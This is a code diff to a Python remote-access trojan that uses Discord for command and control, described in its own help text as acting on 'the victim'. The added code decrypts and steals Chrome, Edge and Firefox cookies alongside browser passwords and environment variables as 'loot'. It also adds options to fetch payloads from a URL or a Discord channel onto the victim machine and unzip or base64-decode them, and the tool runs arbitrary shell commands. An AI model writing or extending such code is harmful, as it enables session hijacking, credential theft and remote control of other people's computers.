@@ -6,8 +6,10 @@ OPENAI_API_KEY = ""
 import os
 import Crypto
 import re
+import shlex
 import subprocess
 import getpass
+from urllib.parse import unquote, urlsplit
 import discord
 import asyncio
 import random
@@ -162,6 +164,12 @@ class DiscordC2(discord.Client):
         content = message.content.strip()
         cmd = content.lower()
         self.last_heartbeat = time.time()
+
+        def strip_outer_quotes(value):
+            if len(value) >= 2 and value[0] == value[-1] and value[0] in ('"', "'"):
+                return value[1:-1]
+            return value
+
         # Recognize !report and !abort regardless of case/whitespace
         if cmd == "!report":
             await self.generate_and_upload_report(message.channel)
@@ -238,9 +246,11 @@ class DiscordC2(discord.Client):
     • `!ls [path]` — List directory contents
     • `!cd [path]` — Change current directory
     • `!download [path]` — Download a file from the victim
-    • `!upload <url|filename> [dest]` — Upload a file from URL or #payloads
+    • `!upload <url|filename> [dest]` — Download from URL or retrieve from #payloads
+    • `!upload --zip <archive.zip> [dest]` — Retrieve a zip payload and extract it after download
+    • `!upload --b64 <payload.b64> [dest]` — Retrieve a base64 payload and decode it after download
     • `!delete <path>` — Delete a file on the victim
-    • `!dump [type]` — Collect hashes, browser passwords, WiFi keys, and other loot (types: hash, password, wifi, env, all)
+    • `!dump [type]` — Collect browser passwords, cookies, and environment loot (types: password, cookie, env, all)
     • `!shell <command>` — Run a system shell command and return output
     • Any other text — Executed as a shell command in the agent's current directory
 
@@ -273,12 +283,19 @@ class DiscordC2(discord.Client):
                 "ls": "`!ls [path]` — List directory contents. Defaults to current directory if no path is given.",
                 "cd": "`!cd [path]` — Change the current working directory.",
                 "download": "`!download [path]` — Download a file from the victim machine.",
-                "upload": "`!upload <url|filename> [dest]` — Upload a file from a URL or from #payloads to the victim.",
+                "upload": (
+                    "`!upload [--zip|--b64] <url|filename> [dest]` — Transfer a payload to the victim.\n"
+                    "Modes:\n"
+                    "  default — Download from a URL or retrieve an exact file from #payloads\n"
+                    "  --zip — Retrieve a `.zip` payload, then extract it after download\n"
+                    "  --b64 — Retrieve a `.b64` or `.base64` payload, then decode it after download"
+                ),
                 "delete": "`!delete <path>` — Delete a file on the victim machine.",
                 "dump": (
                     "`!dump [type]` — Collect offensive security loot.\n"
                     "Types:\n"
                     "  password — Only dump browser-saved passwords\n"
+                    "  cookie — Only dump browser cookies\n"
                     "  env — Only dump environment variables\n"
                     "  all — Dump everything (default if no type given)"
                 ),
@@ -303,9 +320,11 @@ class DiscordC2(discord.Client):
             await message.channel.send(f"[dump] Collecting: {subcmd}")
             loot_files = []
             errors = []
+            wants_passwords = subcmd in ("all", "password", "passwords")
+            wants_cookies = subcmd in ("all", "cookie", "cookies")
 
-            # Browser passwords
-            if subcmd in ("all", "password", "passwords"):
+            # Browser passwords and cookies
+            if wants_passwords or wants_cookies:
                 try:
                     import shutil
                     import glob
@@ -333,8 +352,9 @@ class DiscordC2(discord.Client):
                             except Exception:
                                 pass
                             for profile in profiles:
+                                # --- Passwords ---
                                 login_db = os.path.join(base_path, profile, "Login Data")
-                                if os.path.exists(login_db) and os.path.exists(local_state_path):
+                                if wants_passwords and os.path.exists(login_db) and os.path.exists(local_state_path):
                                     loot_path = os.path.join(self.current_dir, f"{browser}_{profile}_passwords.json")
                                     try:
                                         shutil.copy2(login_db, "login_db_copy")
@@ -372,18 +392,110 @@ class DiscordC2(discord.Client):
                                             os.remove("login_db_copy")
                                         except Exception:
                                             pass
+                                # --- Cookies ---
+                                cookie_candidates = [
+                                    os.path.join(base_path, profile, "Network", "Cookies"),
+                                    os.path.join(base_path, profile, "Cookies"),
+                                ]
+                                if profile == "Default":
+                                    cookie_candidates.extend([
+                                        os.path.join(base_path, "Network", "Cookies"),
+                                        os.path.join(base_path, "Cookies"),
+                                    ])
+                                cookies_db = next((path for path in cookie_candidates if os.path.exists(path)), None)
+                                if wants_cookies and cookies_db and os.path.exists(local_state_path):
+                                    cookies_loot_path = os.path.join(self.current_dir, f"{browser}_{profile}_cookies.json")
+                                    try:
+                                        shutil.copy2(cookies_db, "cookies_db_copy")
+                                        with open(local_state_path, "r", encoding="utf-8") as f:
+                                            local_state = js.load(f)
+                                        key_b64 = local_state["os_crypt"]["encrypted_key"]
+                                        key = base64.b64decode(key_b64)[5:]
+                                        master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+                                        conn = sqlite3.connect("cookies_db_copy")
+                                        cursor = conn.cursor()
+                                        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, last_access_utc FROM cookies")
+                                        cookies = []
+                                        for row in cursor.fetchall():
+                                            host, name, path, encrypted, expires, secure, httponly, last_access = row
+                                            if encrypted[:3] == b'v10':
+                                                iv = encrypted[3:15]
+                                                payload = encrypted[15:]
+                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                try:
+                                                    value = cipher.decrypt(payload)[:-16].decode()
+                                                except Exception:
+                                                    value = "[decryption failed]"
+                                            else:
+                                                try:
+                                                    value = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
+                                                except Exception:
+                                                    value = "[decryption failed]"
+                                            cookies.append({
+                                                "browser": browser,
+                                                "profile": profile,
+                                                "host": host,
+                                                "name": name,
+                                                "path": path,
+                                                "value": value,
+                                                "expires_utc": expires,
+                                                "is_secure": bool(secure),
+                                                "is_httponly": bool(httponly),
+                                                "last_access_utc": last_access
+                                            })
+                                        with open(cookies_loot_path, "w", encoding="utf-8") as loot:
+                                            js.dump(cookies, loot, indent=2)
+                                        conn.close()
+                                        loot_files.append(cookies_loot_path)
+                                    finally:
+                                        try:
+                                            os.remove("cookies_db_copy")
+                                        except Exception:
+                                            pass
                     # Firefox: just copy logins.json (decryption is more complex)
                     ff_profiles = glob.glob(os.path.join(user_dir, r"AppData\Roaming\Mozilla\Firefox\Profiles\*"))
                     for prof in ff_profiles:
                         logins = os.path.join(prof, "logins.json")
-                        if os.path.exists(logins):
+                        if wants_passwords and os.path.exists(logins):
                             loot_path = os.path.join(self.current_dir, os.path.basename(prof) + "_logins.json")
                             shutil.copy2(logins, loot_path)
                             loot_files.append(loot_path)
+                        # --- Firefox cookies ---
+                        cookies_sqlite = os.path.join(prof, "cookies.sqlite")
+                        if wants_cookies and os.path.exists(cookies_sqlite):
+                            cookies_loot_path = os.path.join(self.current_dir, os.path.basename(prof) + "_cookies.json")
+                            try:
+                                shutil.copy2(cookies_sqlite, "ff_cookies_db_copy")
+                                conn = sqlite3.connect("ff_cookies_db_copy")
+                                cursor = conn.cursor()
+                                cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, lastAccessed FROM moz_cookies")
+                                cookies = []
+                                for row in cursor.fetchall():
+                                    host, name, value, path, expiry, secure, httponly, last_access = row
+                                    cookies.append({
+                                        "browser": "Firefox",
+                                        "profile": os.path.basename(prof),
+                                        "host": host,
+                                        "name": name,
+                                        "path": path,
+                                        "value": value,
+                                        "expires_utc": expiry,
+                                        "is_secure": bool(secure),
+                                        "is_httponly": bool(httponly),
+                                        "last_access_utc": last_access
+                                    })
+                                with open(cookies_loot_path, "w", encoding="utf-8") as loot:
+                                    js.dump(cookies, loot, indent=2)
+                                conn.close()
+                                loot_files.append(cookies_loot_path)
+                            finally:
+                                try:
+                                    os.remove("ff_cookies_db_copy")
+                                except Exception:
+                                    pass
                 except Exception as e:
                     errors.append(f"Browser loot error: {e}")
-            # WiFi keys
-            # Env vars
+            # Environment variables
             if subcmd in ("all", "env", "envs", "envvar", "envvars"):
                 try:
                     env_out = os.path.join(self.current_dir, "env_vars.json")
@@ -461,16 +573,23 @@ class DiscordC2(discord.Client):
                     import ctypes
                     ctypes.windll.user32.MessageBoxW(0, msg, "Message from Admin", 0)
                 elif platform.system() == "Darwin":
-                    os.system(f'''osascript -e 'display dialog "{msg}" with title "Message from Admin"' ''')
+                    subprocess.run(
+                        ["osascript", "-e", f'display dialog {json.dumps(msg)} with title "Message from Admin"'],
+                        check=False,
+                    )
                 else:
-                    os.system(f'zenity --info --text="{msg}" --title="Message from Admin" 2>/dev/null &')
+                    subprocess.Popen(
+                        ["zenity", "--info", f"--text={msg}", "--title=Message from Admin"],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                    )
                 await message.channel.send(f"✅ Message box displayed.")
             except Exception as e:
                 await message.channel.send(f"❌ Could not display message box: {e}")
             return
         # !delete command
         if cmd.startswith("!delete"):
-            path = content[7:].strip()
+            path = strip_outer_quotes(content[7:].strip())
             if not path:
                 await message.channel.send("❌ Usage: !delete <path to file>")
                 return
@@ -484,20 +603,31 @@ class DiscordC2(discord.Client):
             return
         # !ls command
         if cmd.startswith("!ls"):
-            path = content[3:].strip() or self.current_dir
+            path = strip_outer_quotes(content[3:].strip()) or self.current_dir
             try:
                 files = os.listdir(path)
                 listing = "\n".join(files)
                 msg = f"**Directory listing for `{path}`:**\n```\n{listing}\n```"
-                await message.channel.send(msg)
-                await self.global_logs_channel.send(f"[ls] {self.hostname}: {msg}")
+                if len(msg) > 1900:
+                    out_file = os.path.join(self.current_dir, "ls_output.txt")
+                    with open(out_file, "w", encoding="utf-8") as file_handle:
+                        file_handle.write(listing)
+                    await message.channel.send(f"📄 Directory listing for `{path}` is too large, attached as file:", file=discord.File(out_file))
+                    await self.global_logs_channel.send(f"[ls] {self.hostname}: Output too large for `{path}`, sent as file.")
+                    try:
+                        os.remove(out_file)
+                    except Exception:
+                        pass
+                else:
+                    await message.channel.send(msg)
+                    await self.global_logs_channel.send(f"[ls] {self.hostname}: {msg}")
             except Exception as e:
                 await message.channel.send(f"❌ ls error: {e}")
                 await self.global_logs_channel.send(f"[ls] {self.hostname}: ❌ ls error: {e}")
             return
         # !cd command
         if cmd.startswith("!cd"):
-            path = content[3:].strip()
+            path = strip_outer_quotes(content[3:].strip())
             if not path:
                 await message.channel.send(f"Current directory: `{self.current_dir}`")
                 await self.global_logs_channel.send(f"[cd] {self.hostname}: Current directory: `{self.current_dir}`")
@@ -513,7 +643,7 @@ class DiscordC2(discord.Client):
             return
         # !download command
         if cmd.startswith("!download"):
-            path = content[9:].strip()
+            path = strip_outer_quotes(content[9:].strip())
             if not path:
                 await message.channel.send("❌ Usage: !download [path]")
                 await self.global_logs_channel.send(f"[download] {self.hostname}: Usage error")
@@ -530,12 +660,21 @@ class DiscordC2(discord.Client):
                 await message.channel.send(f"❌ Download error: {e}")
                 await self.global_logs_channel.send(f"[download] {self.hostname}: Download error: {e}")
             return
-        # !upload command
+        # !upload command with --zip and --b64 support
         if cmd.startswith("!upload "):
+            import base64
+            import zipfile
             arg = content[8:].strip()
-            parts = arg.split()
+            parts = [part.strip('"') for part in shlex.split(arg, posix=False)]
             if not parts:
-                await message.channel.send("❌ Usage: !upload <filename or url> [destination_path]")
+                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
+                return
+            flag = None
+            if parts[0] in ("--zip", "--b64"):
+                flag = parts[0]
+                parts = parts[1:]
+            if not parts:
+                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
                 return
             src = parts[0]
             dest_path = parts[1] if len(parts) > 1 else None
@@ -547,34 +686,61 @@ class DiscordC2(discord.Client):
                     except Exception:
                         downloads_dir = self.current_dir
                 dest_path = downloads_dir
+            def resolve_output_path(target_path, source_name):
+                explicit_dir = target_path.endswith((os.sep, "/")) or (os.altsep and target_path.endswith(os.altsep))
+                if os.path.isabs(target_path):
+                    return os.path.join(target_path, source_name) if explicit_dir or os.path.isdir(target_path) else target_path
+                abs_dest = os.path.join(self.current_dir, target_path)
+                return os.path.join(abs_dest, source_name) if explicit_dir or os.path.isdir(abs_dest) else abs_dest
+
+            def ensure_parent_dir(file_path):
+                parent_dir = os.path.dirname(file_path)
+                if parent_dir:
+                    os.makedirs(parent_dir, exist_ok=True)
+
+            def decoded_output_name(source_name):
+                if source_name.lower().endswith(".b64"):
+                    return source_name[:-4]
+                if source_name.lower().endswith(".base64"):
+                    return source_name[:-7]
+                return source_name + ".decoded"
+
+            # Download from URL
             if re.match(r"https?://", src):
-                filename = src.split("/")[-1]
-                if os.path.isabs(dest_path):
-                    filepath = os.path.join(dest_path, filename) if os.path.isdir(dest_path) else dest_path
-                else:
-                    abs_dest = os.path.join(self.current_dir, dest_path)
-                    filepath = os.path.join(abs_dest, filename) if os.path.isdir(abs_dest) else abs_dest
+                url_parts = urlsplit(src)
+                filename = os.path.basename(unquote(url_parts.path)) or "downloaded_payload.bin"
+                filepath = resolve_output_path(dest_path, filename)
                 try:
                     import requests
                     r = requests.get(src, allow_redirects=True, timeout=30)
                     r.raise_for_status()
-                    os.makedirs(os.path.dirname(filepath), exist_ok=True)
+                    ensure_parent_dir(filepath)
                     with open(filepath, "wb") as f:
                         f.write(r.content)
-                    await message.channel.send(f"✅ File `{filename}` downloaded from {src} to `{filepath}`")
-                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} to `{filepath}`")
+                    if flag == "--zip":
+                        with zipfile.ZipFile(filepath, "r") as zipf:
+                            zipf.extractall(os.path.dirname(filepath))
+                        os.remove(filepath)
+                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and extracted to `{os.path.dirname(filepath)}`")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and extracted to `{os.path.dirname(filepath)}`")
+                    elif flag == "--b64":
+                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
+                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
+                            base64.decode(f_in, f_out)
+                        os.remove(filepath)
+                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and decoded to `{decoded_path}`")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and decoded to `{decoded_path}`")
+                    else:
+                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} to `{filepath}`")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} to `{filepath}`")
                 except Exception as e:
                     await message.channel.send(f"❌ Upload failed: {e}")
                     await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
                 return
             filename = src
-            if os.path.isabs(dest_path):
-                filepath = os.path.join(dest_path, filename) if os.path.isdir(dest_path) else dest_path
-            else:
-                abs_dest = os.path.join(self.current_dir, dest_path)
-                filepath = os.path.join(abs_dest, filename) if os.path.isdir(abs_dest) else abs_dest
+            filepath = resolve_output_path(dest_path, filename)
             try:
-                os.makedirs(os.path.dirname(filepath), exist_ok=True)
+                ensure_parent_dir(filepath)
                 found = False
                 async for msg in self.payload_channel.history(limit=100):
                     for att in msg.attachments:
@@ -588,8 +754,31 @@ class DiscordC2(discord.Client):
                     await message.channel.send(f"❌ File `{filename}` not found in #payloads.")
                     await self.global_logs_channel.send(f"[upload] {self.hostname}: `{filename}` not found in #payloads.")
                     return
-                await message.channel.send(f"✅ File `{filename}` retrieved from #payloads to `{filepath}`.")
-                await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads to `{filepath}`.")
+                # Decompress or decode if needed
+                if flag == "--zip":
+                    try:
+                        with zipfile.ZipFile(filepath, "r") as zipf:
+                            zipf.extractall(os.path.dirname(filepath))
+                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and extracted to `{os.path.dirname(filepath)}`.")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and extracted to `{os.path.dirname(filepath)}`.")
+                        os.remove(filepath)
+                    except Exception as e:
+                        await message.channel.send(f"❌ Zip extraction failed: {e}")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Zip extraction failed: {e}")
+                elif flag == "--b64":
+                    try:
+                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
+                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
+                            base64.decode(f_in, f_out)
+                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and decoded to `{decoded_path}`.")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and decoded to `{decoded_path}`.")
+                        os.remove(filepath)
+                    except Exception as e:
+                        await message.channel.send(f"❌ Base64 decode failed: {e}")
+                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Base64 decode failed: {e}")
+                else:
+                    await message.channel.send(f"✅ File `{filename}` retrieved from #payloads to `{filepath}`.")
+                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads to `{filepath}`.")
             except Exception as e:
                 await message.channel.send(f"❌ Upload failed: {e}")
                 await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
